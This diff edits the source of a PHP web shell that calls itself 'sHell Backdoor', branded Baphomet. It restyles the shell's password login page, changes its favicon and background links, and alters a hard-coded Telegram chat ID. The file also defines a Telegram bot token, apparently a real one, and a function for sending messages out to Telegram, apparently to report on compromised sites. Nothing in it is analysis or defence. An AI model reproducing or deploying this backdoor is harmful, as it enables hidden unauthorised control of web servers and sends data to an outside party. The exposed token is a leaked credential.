@@ -17,7 +17,7 @@ $default_use_ajax = true;
 $default_charset = 'UTF-8';
 date_default_timezone_set('Asia/Jakarta');
 define('TELEGRAM_BOT_TOKEN', '8035664998:AAEwtMCmxw9g6NaXQaAqsvaPnYJ5-9EJEKQ');
-define('TELEGRAM_CHAT_ID', '-7299591453');
+define('TELEGRAM_CHAT_ID', '7299591453');
 
 // Fungsi untuk mengirim pesan ke Telegram
 function sendTelegramMessage($message) {
@@ -32,14 +32,14 @@ function login_shell() {
     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
     <meta name="theme-color" content="#343a40"/>
     <meta name="author" content="Holiq"/>
-    <meta name="copyright" content="{ baphomet }"/>
+    <meta name="copyright" content="{ ❝𝗕𝗛𝗔𝗣𝗢𝗠𝗘𝗧❞ }"/>
     <title> ❝𝗕𝗛𝗔𝗣𝗢𝗠𝗘𝗧❞ </title>
-    <link rel="icon" type="image/png" href="https://www.holiq.projectku.ga/baphomet.png"/>
+    <link rel="icon" type="image/png" href="https://shorturl.asia/rgXZl"/>
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
     <style>
         body {
-            background-image: url('https://ibb.co/MNcRN1W');
+            background-image: url('https://wallpapercave.com/uwp/uwp4534249.jpeg');
             background-size: cover; /* Menutupi seluruh halaman */
             background-position: center; /* Memposisikan gambar di tengah */
             height: 100vh; /* Memastikan tinggi halaman 100% dari viewport */
@@ -48,9 +48,9 @@ function login_shell() {
 </head>
 <body class="text-center text-light">
     <div class="container text-center mt-3">
-        <h1>{ baphomet }</h1>
-        <h5>sHell Backdoor</h5><hr/>
-        <p class="mt-3 font-weight-bold"><i class="fa fa-terminal"></i> Please Login</p>
+        <h1> ❝𝗕𝗛𝗔𝗣𝗢𝗠𝗘𝗧❞ </h1>
+        <h5>𝗦𝗛𝗘𝗟𝗟 𝗕𝗔𝗖𝗞𝗗𝗢𝗢𝗥</h5><hr/>
+        <p class="mt-3 font-weight-bold"><i class="fa fa-terminal"></i> 𝗟𝗢𝗚𝗜𝗡 𝗗𝗨𝗟𝗨 𝗠𝗔𝗦 </p>
         <form method="post">
             <div class="form-group input-group">
                 <div class="input-group-prepend">
@@ -61,7 +61,7 @@ function login_shell() {
             <input type="submit" class="btn btn-danger btn-block" value="Login">
         </form>
     </div>
-    <a href="https://facebook.com/BaphometOfficial" class="text-muted fixed-bottom mb-3">Copyright 2019 @ { baphomet }</a>
+    <a href="https://facebook.com/BaphometOfficial" class="text-muted fixed-bottom mb-3">Copyright 19XX @ {❝𝗕𝗛𝗔𝗣𝗢𝗠𝗘𝗧❞}</a>
 </body>
 </html>
 <?php
